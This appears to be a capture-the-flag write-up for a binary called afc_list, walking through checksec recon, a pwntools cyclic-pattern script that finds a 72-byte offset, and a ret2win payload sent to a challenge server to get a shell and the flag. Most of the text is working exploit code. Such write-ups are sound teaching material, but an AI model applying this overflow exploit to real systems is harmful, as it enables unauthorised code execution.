<t>afc_list - Stack Buffer Overflow</t>

This challenge gives a binary that reads names into a fixed-size stack buffer without checking the length. The goal is to overwrite the saved return address and redirect execution to a hidden win() function.

<st>Recon</st>

I started by checking the binary's protections.

<c>
checksec --file=afc_list
file afc_list
</c>

NX was enabled but the stack canary was missing, which made this a straightforward ret2win.

<st>Finding the offset</st>

I used a cyclic pattern to find exactly how many bytes are needed before the return address.

<c>
from pwn import *
io = process('./afc_list')
io.sendline(cyclic(200))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(offset)
</c>

<img>screenshots/afc_list_crash.png</img>

The offset came out to 72 bytes.

<st>Exploit</st>

With the offset known, I built the final payload and sent it to the remote server.

<c>
payload = b'A' * 72 + p64(win_addr)
io = remote('challenge.host', 1337)
io.sendline(payload)
io.interactive()
</c>

This returned a shell and printed the flag.
